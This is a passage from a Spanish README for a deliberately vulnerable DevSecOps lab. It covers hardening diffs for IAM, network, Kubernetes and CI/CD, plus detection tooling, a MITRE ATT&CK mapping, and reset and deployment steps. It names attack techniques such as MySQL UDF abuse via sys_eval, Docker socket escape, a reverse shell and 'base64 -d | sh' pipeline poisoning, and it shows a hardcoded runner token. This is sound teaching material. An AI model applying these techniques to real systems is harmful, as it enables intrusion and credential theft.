| App | Secretos en `config.inc.php` | K8s Secret montado como env | 🟠 | 🟢 | External Secrets Operator / Vault |

<details>
<summary><strong>Diffs · IaC (Terraform)</strong></summary>

```diff
# iam.tf
- Principal = "*"
+ Principal = { AWS = "arn:aws:iam::${var.account_id}:root" }
+ Condition = { StringEquals = { "sts:ExternalId" = var.external_id } }

- Action = "iam:PassRole"
- Resource = "*"
+ Action   = "iam:PassRole"
+ Resource = ["arn:aws:iam::${var.account_id}:role/devsecops-ec2-role"]

- policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
+ policy_arn = aws_iam_policy.minimal_privilege_policy.arn
```

```diff
# network.tf
- ingress { from_port = 22,   cidr_blocks = ["0.0.0.0/0"] }
+ ingress { from_port = 22,   cidr_blocks = [var.admin_cidr] }
- ingress { from_port = 2375, cidr_blocks = ["0.0.0.0/0"] }   # Docker API sin cifrar
+ # (regla 2375 eliminada — usar SSH tunneling o TLS 2376)
- egress  { protocol = "-1",  cidr_blocks = ["0.0.0.0/0"] }
+ egress  { from_port = 443, protocol = "tcp", cidr_blocks = ["0.0.0.0/0"] }
```

```diff
# s3.tf
- block_public_acls = false ; block_public_policy = false ; ignore_public_acls = false ; restrict_public_buckets = false
+ block_public_acls = true  ; block_public_policy = true  ; ignore_public_acls = true  ; restrict_public_buckets = true
- # bucket policy con Principal = "*"
+ # (aws_s3_bucket_policy eliminado; + SSE-KMS y versioning habilitados)
```

<details><summary>Versión hardened completa (para copiar-pegar)</summary>

```hcl
# iam.tf — hardened
resource "aws_iam_role" "restricted_role" {
  name = "devsecops-restricted-role"
  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Action = "sts:AssumeRole", Effect = "Allow"
      Principal = { AWS = "arn:aws:iam::${var.account_id}:root" }
      Condition = { StringEquals = { "sts:ExternalId" = var.external_id } }
    }]
  })
}
resource "aws_iam_policy" "passrole_restricted" {
  name   = "PassRoleRestrictedPolicy"
  policy = jsonencode({ Version = "2012-10-17", Statement = [{
    Effect = "Allow", Action = "iam:PassRole",
    Resource = ["arn:aws:iam::${var.account_id}:role/devsecops-ec2-role"]
  }]})
}
resource "aws_iam_policy" "minimal_privilege_policy" {
  name   = "DevsecopsMinimalPolicy"
  policy = jsonencode({ Version = "2012-10-17", Statement = [{
    Effect = "Allow", Action = ["s3:GetObject","ec2:DescribeInstances"], Resource = "*"
  }]})
}

# network.tf — hardened
resource "aws_security_group" "hardened_sg" {
  name = "restricted-management-sg"; vpc_id = aws_vpc.hardened_vpc.id
  ingress { description = "SSH admin only", from_port = 22, to_port = 22, protocol = "tcp", cidr_blocks = [var.admin_cidr] }
  egress  { description = "HTTPS out",      from_port = 443, to_port = 443, protocol = "tcp", cidr_blocks = ["0.0.0.0/0"] }
  egress  { description = "HTTP out",       from_port = 80,  to_port = 80,  protocol = "tcp", cidr_blocks = ["0.0.0.0/0"] }
}

# s3.tf — hardened
resource "aws_s3_bucket_public_access_block" "block_all" {
  bucket = aws_s3_bucket.private_bucket.id
  block_public_acls = true; block_public_policy = true; ignore_public_acls = true; restrict_public_buckets = true
}
resource "aws_s3_bucket_server_side_encryption_configuration" "sse" {
  bucket = aws_s3_bucket.private_bucket.id
  rule { apply_server_side_encryption_by_default { sse_algorithm = "aws:kms" } }
}
```
</details>

Recupera el mínimo privilegio en IAM (asunción del rol y PassRole), el deny por defecto en red y el bucket cerrado. `tfsec`/`checkov` cortan `Principal:*`, `PassRole Resource:*` y los attach de admin antes del `apply`. El control de mayor cobertura por coste es S3 Block Public Access a nivel de cuenta, que anula cualquier bucket policy pública. Eso sí, como LocalStack no enforcea IAM (Capa 6), aquí el valor real de estos fixes lo pone el análisis estático y no la ejecución.

</details>

<details>
<summary><strong>Diffs · Provisioning (Ansible)</strong></summary>

```diff
- - name: Desactivar Firewall (UFW)
-   ufw: { state: disabled }
+ - name: Habilitar UFW con política deny por defecto
+   ufw: { state: enabled, policy: deny }
+ - name: Permitir SSH solo desde la red de administración
+   ufw: { rule: allow, port: 22, proto: tcp, src: "{{ admin_network_cidr }}" }

- - name: Socket de Docker 0777
-   file: { path: /var/run/docker.sock, mode: '0777' }
+ - name: Socket de Docker restringido al grupo docker
+   file: { path: /var/run/docker.sock, owner: root, group: docker, mode: '0660' }
+ - name: Deshabilitar Docker API sin cifrar (2375)
+   lineinfile: { path: /etc/docker/daemon.json, line: '{"hosts":["unix:///var/run/docker.sock"]}', create: yes }
+ - name: Auditoría del socket de Docker
+   lineinfile: { path: /etc/audit/rules.d/docker.rules, line: "-w /var/run/docker.sock -p rwxa -k docker_socket", create: yes }
```

Socket a `root:docker` `0660`, firewall a deny. `ansible-lint` marca el `0777` y el `ufw: disabled`, e `inspec`/`auditd` lo verifican tras el despliegue.

</details>

<details>
<summary><strong>Diffs · Kubernetes</strong></summary>

```diff
# mysql / act-runner
  securityContext:
-   capabilities: { add: [SYS_ADMIN] }
-   privileged: true
+   allowPrivilegeEscalation: false
+   runAsNonRoot: true
+   readOnlyRootFilesystem: true
+   capabilities: { drop: ["ALL"] }
  volumeMounts:
-   - { mountPath: /var/run/docker.sock, name: docker-sock }   # eliminado
  volumes:
-   - hostPath: { path: /var/run/docker.sock }                 # eliminado
+   # builds vía Kaniko/Buildah, sin acceso al daemon del host
```

```yaml
# Pod Security Admission a nivel de namespace — enforcement nativo, sin webhook externo
metadata:
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/warn: restricted
```

```bash
# Cifrado de Secrets en reposo (K3s)
curl -sfL https://get.k3s.io | sh -s - --secrets-encryption --write-kubeconfig-mode 600
k3s secrets-encrypt status   # → Encryption: enabled (AES-CBC 256)
```

Ningún pod accede ya al daemon ni a los namespaces del host, y los Secrets no se leen del disco sin la clave. PSA `restricted` rechaza `privileged`/`hostPath`/`hostPID`/`hostNetwork` en el API server. Builds con Kaniko o Buildah, y políticas de imagen con Gatekeeper o Kyverno.

</details>

<details>
<summary><strong>Diffs · CI/CD y credenciales federadas (OIDC)</strong></summary>

```diff
# gitea-deployment.yaml
- kind: ConfigMap
-   app.ini: | ... SECRET_KEY = secretkeylabdevsecops ...
+ kind: Secret            # o referencia a External Secrets Operator / Vault
+   SECRET_KEY: <base64 aleatorio>
# montado como env vía secretKeyRef, nunca en el ConfigMap

# act-runner.yaml
-     --token y2HtdzweXvxJ4g11FGxcByl8A2DjH1UiU6tpXYGl
+     --token $(cat /run/secrets/runner-token)
```

El paso intermedio es mover los secretos del ConfigMap a un `Secret` de Kubernetes. Sigue siendo un secreto estático, robable. La opción sin secretos estáticos es OIDC federation:

```yaml
# workflow: credenciales temporales, sin claves estáticas
- uses: aws-actions/configure-aws-credentials@v4
  with:
    role-to-assume: arn:aws:iam::${{ vars.AWS_ACCOUNT_ID }}:role/Gitea-OIDC-Role
    aws-region: us-east-1     # sin AWS_ACCESS_KEY_ID ni AWS_SECRET_ACCESS_KEY
```

```hcl
# iam.tf — el rol solo confía en un repo/rama concretos, vía JWT firmado por Gitea
resource "aws_iam_role" "gitea_oidc_role" {
  assume_role_policy = jsonencode({ Version = "2012-10-17", Statement = [{
    Effect = "Allow"
    Principal = { Federated = aws_iam_openid_connect_provider.gitea.arn }
    Action = "sts:AssumeRoleWithWebIdentity"
    Condition = { StringEquals = { "${var.gitea_host}:sub" = "repo:${var.gitea_org}/${var.gitea_repo}:ref:refs/heads/main" } }
  }]})
}
```

Con OIDC no queda credencial en ConfigMaps, Secrets, entorno ni ficheros. El token se emite en ejecución para un repo y una rama, dura 15 min por defecto y no sirve fuera de ahí. Comprometer el runner da un token que caduca enseguida, o sea que sirve para poco.

Gitleaks en pre-commit y en PR, y `tfsec` sobre los roles OIDC.

</details>

### Prevención, detección y respuesta

Los diffs arreglan los casos concretos. El proceso que los generó (desarrollo sin revisión de seguridad, IaC que llega a producción sin ningún control por delante) los repetirá si nadie lo cambia. En tres bloques:

```
┌───────────────────────────────────────────────────────────────────┐
│  PREVENCIÓN (shift-left)                                            │
│  tfsec / checkov en PR · Gitleaks pre-commit                       │
│  ansible-lint · Kyverno / OPA en admission controller             │
├───────────────────────────────────────────────────────────────────┤
│  DETECCIÓN (runtime)                                               │
│  IAM Access Analyzer · AWS Config Rules · Falco                   │
│  auditd en el host · Pod Security Admission en modo enforce       │
├───────────────────────────────────────────────────────────────────┤
│  RESPUESTA (post-incidente)                                       │
│  Terraform state cifrado · S3 versioning · K3s audit log         │
│  Rotación automática de credenciales · OIDC federation           │
└───────────────────────────────────────────────────────────────────┘
```

Como el IaC se despliega igual en todos los entornos, un fix en `iam.tf` entra en todos a la vez y queda en el historial de Git.

---

## MITRE ATT&CK — cobertura

La cadena toca 11 de las 14 tácticas de la Matriz Enterprise. Fuera quedan Impact, Resource Development y Reconnaissance, por ser un entorno controlado sin objetivos externos. La tabla lista una técnica por táctica, todas con explotación real en el lab.

| Táctica | Técnica representativa | ID | Detección característica |
|---|---|---|---|
| Initial Access | Exploit Public-Facing Application | T1190 | WAF: `.php` en directorio de uploads |
| Execution | UDF Abuse (`sys_eval`) | T1203 | MySQL log: `CREATE FUNCTION` + `INTO DUMPFILE` |
| Persistence | Compromise Infrastructure: CI/CD | T1584 | Gitleaks: token en diff de manifiesto |
| Privilege Escalation | Escape to Host | T1611 | Falco: contenedor con `privileged` + host mount |
| Defense Evasion | Obfuscated Files or Information | T1027 | Análisis estático: `base64 -d \| sh` en workflow |
| Credential Access | Unsecured Credentials: Kine DB | T1552.007 | auditd: acceso a `state.db` |
| Discovery | Cloud Service Discovery | T1526 | CloudTrail: ráfaga de `list-*` sin user-agent legítimo |
| Lateral Movement | Container API for Lateral Movement | T1610 | Falco: `connect` a `docker.sock` desde proceso no-`dockerd` |
| Collection | Data from Information Repositories | T1213 | FIM sobre `hostPath` de pods de infraestructura |
| Command & Control | Non-Standard Port | T1571 | Egress a puerto distinto de 80/443 desde un pod |
| Exfiltration | Exfiltration to Cloud Storage | T1567.002 | S3 access logs: `PUT` anónimo externo |

> El mapeo técnica por técnica, con materialización, detección y mitigación de cada una, está en [`docs/MITRE-MATRIX.md`](docs/MITRE-MATRIX.md). Es material de consulta.

<!-- NOTA: la tabla exhaustiva de ~40 técnicas del README original va a docs/MITRE-MATRIX.md.
     Este README solo enlaza al detalle. -->

---

## Notas técnicas

A nivel de contenedor, el de DVWA es lo más aislado del lab (irónico, porque la aplicación es un queso gruyer...).

Lo de la API de Docker sin CLI fue por protocolo: sin comandos como `docker` o `curl` y sin nada de red, las peticiones hay que hacerlas "a mano" sobre el socket con el módulo `socket` de Python. Y lo peor no fue eso, sino que los tres fallos que me tuvieron atascado (`alpine` en vez de `mysql:5.7`, `NetworkMode: host`, `Binds` en vez de `mount --bind`) no daban ningún error porque como comento antes el contenedor se crea, arranca, y simplemente no hace nada, solo tira un error silencioso en los logs. El del `NetworkMode` me comió una tarde entera; la reverse shell salía por el NAT de la bridge y se perdía...

El CI/CD casi nunca se ve en el modelo de amenazas, y es lo más sencillo, literalmente cuesta una línea de YAML.

---

## Diario de montaje

Los fallos de arriba son los que forman parte del ataque. Estos otros son los que me di levantando la infra, que no salen en la cadena pero me comieron su buen rato y los dejo apuntados por si alguien monta algo parecido.

<details>
<summary><strong>Errores de montaje y cómo los resolví</strong></summary>

**Gitea volvía una y otra vez al asistente de instalación, o se quedaba cargando al pulsar "Instalar".** La imagen rootless de Gitea no tiene permisos para escribir en `/etc/gitea/app.ini`, que es justo donde el asistente web guarda la config y donde Gitea intenta escribir sus secretos dinámicos (`INTERNAL_TOKEN`, `oauth2.JWT_SECRET`, `lfs.JWT_SECRET`) en el primer arranque. La solución fue saltarme el asistente entero, dejar toda la config en un `ConfigMap` con `INSTALL_LOCK = true` y todos esos secretos fijados a mano, y en vez de montar el `ConfigMap` directo sobre el `app.ini` (que queda de solo lectura) usar un `initContainer` que copia la plantilla a una ruta con escritura (`/var/lib/gitea/data/app.ini`). Aún así el copiado me dio otro `permission denied`, porque `busybox` corre como root y crea el fichero `root:root`, mientras que Gitea corre como el usuario `git` (UID 1000), así que metí un `chown -R 1000:1000` en el propio `initContainer` para que no vuelva a pasar. Y ojo, si recreas la `gitea.db` en pruebas el admin anterior desaparece, toca crear uno nuevo por CLI con `gitea admin user create ... --admin`.

**La CPU al 100% con Docker y K3s a la vez.** K3s trae su propio containerd, y con el Docker del host encima los dos peleaban por los mismos cgroups. Se juntaba con que GitLab CE (que aún tenía puesto) pedía hasta 4 CPU y 8 GB. Lo resolví decidiendo runtime único, K3s sobre Docker (`--docker`), que además es lo que necesita el runner. De propina, al parar Docker a lo bruto se quedaron sockets y locks huérfanos en `/var/run/` y el daemon no arrancaba, se arregla borrando `docker.sock`, `docker.pid` y `containerd/*` y volviendo a levantarlo.

**Se perdían usuarios, repos y el registro del runner al reiniciar la VM.** `gitea-data` ya iba en `hostPath`, pero el runner guardaba en `emptyDir` o en `/tmp`, que la VM puede limpiar al reiniciar. Moví el volumen del runner a `/var/lib/act-runner-data` (fuera de `/tmp`), con `DirectoryOrCreate` y permisos `1000:1000`.

**Pipeline lentísimo, 10-20 minutos por ejecución.** Eran tres cosas a la vez, el runner iba corto (1 CPU / 1 GB), Trivy se bajaba su base de datos de vulnerabilidades entera en cada run, y las imágenes (`trivy`, `gitleaks`) no estaban pre-descargadas en el host. Subí el runner a 4 CPU / 4 GB, monté un volumen de caché para Trivy (`-v /tmp/trivy-cache:/root/.cache/`) e hice `docker pull` de las imágenes una vez.

**Casi la lío con un rebase y pensé que había perdido todo el árbol de archivos.** Resolviendo un conflicto de rebase a favor de la versión que solo tenía el workflow, el puntero de `main` quedó apuntando a un commit sin el resto del código, y por un momento pareció que `src/` y `k8s/` se habían borrado. No se había perdido nada, era el puntero de rama, recuperable con `git reflog`. El error de verdad fue hacer un `git reset --hard` al commit equivocado sin mirar qué llevaba dentro, lo arreglé apuntando al commit bueno de verdad (`git reset --hard e7415a1` + `push --force`). La lección, mirar el contenido de un commit con `git show --stat` o `git ls-tree` antes de mover la rama a lo bestia.

</details>

---

## Reset — dejar el lab limpio entre intentos

El UDF abuse y el escape dejan rastro (la tabla `udf_blob`, la `.so` en el `plugin_dir` y contenedores `escape1` sueltos en el daemon del host), y ese rastro puede confundir un segundo pase, así que conviene limpiar antes de volver a empezar.

```bash
# 1 — Contenedores efímeros del escape (en el host)
docker rm -f escape1 2>/dev/null || true

# 2 — Rastro del UDF en MySQL
mysql -u app -pvulnerables dvwa -e "DROP FUNCTION IF EXISTS sys_eval; DROP TABLE IF EXISTS udf_blob;"
rm -f /usr/lib/mysql/plugin/udf_sys.so   # o la ruta que devolviera @@plugin_dir

# 3 — Apps y clúster
kubectl delete -f 04-cicd-pipeline/devsecops-demo/k8s/vulnerable/ --ignore-not-found
kubectl delete -f 03-k8s-cluster/ --ignore-not-found

# 4 — IaC y estado de LocalStack
cd 01-cloud-iac/vulnerable && terraform destroy -auto-approve
cd .. && docker-compose down -v          # -v borra el estado de LocalStack

# 5 — Re-desplegar desde el paso 2 de "Despliegue"
```

Si arrancas LocalStack con `PERSISTENCE=1` el estado sobrevive al reinicio del contenedor y no se limpia con un simple `restart`, usa el `down -v` de arriba.

---

## Despliegue

<details>
<summary><strong>Prerrequisitos, red y orden de despliegue</strong></summary>

### Prerrequisitos

| Componente | Versión | Notas |
|---|---|---|
| SO | Ubuntu 22.04 LTS | Probado también en Debian 12 |
| Docker Engine | 24.x | LocalStack + pods del lab |
| K3s | v1.28+ | Se instala con el script de bootstrap |
| Terraform | 1.6+ | IaC sobre LocalStack |
| Ansible | 2.15+ | Provisioning del host |
| LocalStack | 3.x | Emulador AWS (`docker-compose`) |
| Kubectl / Python | 1.28+ / 3.10+ | Interacción con el clúster / scripts |
| Kali (atacante) | Rolling | `192.168.252.20`; `netcat` requerido |

Un par de cosas del provider de Terraform para LocalStack, que si no el `apply` falla con errores raros. Hay que apuntar los endpoints a LocalStack y saltarse las validaciones de credenciales:

```hcl
provider "aws" {
  access_key = "test"; secret_key = "test"; region = "us-east-1"
  skip_credentials_validation = true
  skip_requester_check        = true
  s3_use_path_style           = true
  endpoints { s3 = "http://192.168.252.10:4566"; iam = "..."; ec2 = "..."; sts = "..." }
}
```

Y desde dentro de un pod, el `--endpoint-url` tiene que apuntar a la IP del host (`192.168.252.10:4566`), no a `localhost`. Si quieres que el contraste vulnerable/hardened se note también en ejecución y no solo en el código, arranca LocalStack con `ENFORCE_IAM=1`, contando con que solo es parcial.

### Red

```
192.168.252.0/24   Red host / Kali
192.168.252.10     Nodo K3s (control-node, donde corre todo)
192.168.252.20     Kali (atacante)
10.42.0.0/24       Red interna de pods (flannel)
10.43.0.0/24       Red de servicios (ClusterIP)
```

### Orden

```bash
# 1 — Repo
git clone https://github.com/<usuario>/devsecops-lab.git && cd devsecops-lab

# 2 — LocalStack
cd 01-cloud-iac && docker-compose up -d
curl http://localhost:4566/_localstack/health | jq '.services | .s3,.iam,.ec2,.sts'   # → "available"

# 3 — IaC vulnerable
cd vulnerable && terraform init && terraform apply -auto-approve

# 4 — K3s (sobre Docker, runtime único)
curl -sfL https://get.k3s.io | sh -s - --docker --disable metrics-server
export KUBECONFIG=/etc/rancher/k3s/k3s.yaml && kubectl get nodes

# 5 — Provisioning vulnerable
cd ../../02-provisioning && ansible-playbook -i inventory.ini site_vulnerable.yml
ls -la /var/run/docker.sock   # → srw-rw-rw- (0777)   |   ufw status → inactive

# 6 — Gitea + Act-Runner
cd ../03-k8s-cluster && kubectl apply -f gitea-deployment.yaml -f act-runner.yaml

# 7 — DVWA + MySQL
cd ../04-cicd-pipeline/devsecops-demo/k8s/vulnerable
kubectl apply -f mysql-vulnerable.yaml -f dvwa-vulnerable.yaml

# 8 — Configurar Gitea y subir el pipeline
#     http://192.168.252.10:30000  →  git push del devsecops-demo
#     El runner se registra contra la URL NodePort (30000), no contra el DNS interno del clúster.
```

**El entorno está listo cuando:** LocalStack healthy (S3/IAM/EC2/STS) · K3s en `Ready` · pods `Running` en `vulnerable-apps` y `gitea` · DVWA accesible en nivel "Low" · `docker.sock` en `0777` · UFW inactivo.

### Versión hardened (contraste)

```bash
cd 01-cloud-iac/hardened  && terraform apply -auto-approve
cd 02-provisioning        && ansible-playbook -i inventory.ini site_hardened.yml
```

</details>

---

## Referencias

- **MITRE ATT&CK Enterprise** — [attack.mitre.org](https://attack.mitre.org) — vocabulario del mapeo táctico.
- **UDF Abuse (MySQL)** — módulo `lib_mysqludf_sys` de [Rapid7/Metasploit](https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql).
- **Docker socket escape** — análisis de Rory McCune / NCC Group sobre abuso del socket Unix sin CLI.
- **Poisoned Pipeline Execution** — Aviv Grafi, Argon Security (2021), *Attacking CI/CD without any Access to Source Code*.
- **OIDC Federation** — AWS, *Creating OIDC identity providers* + Gitea Actions / `aws-actions/configure-aws-credentials`.
- **K3s Secrets Encryption** — [docs.k3s.io/security/secrets-encryption](https://docs.k3s.io/security/secrets-encryption).
- **tfsec / checkov** — [aquasecurity.github.io/tfsec](https://aquasecurity.github.io/tfsec) · [checkov.io](https://checkov.io).

---

## Licencia

MIT — solo para fines educativos y de demostración en entornos controlados y aislados. Usar estas técnicas contra sistemas sin autorización explícita del propietario es ilegal; el autor no se hace responsable del uso fuera del contexto para el que se diseñó.
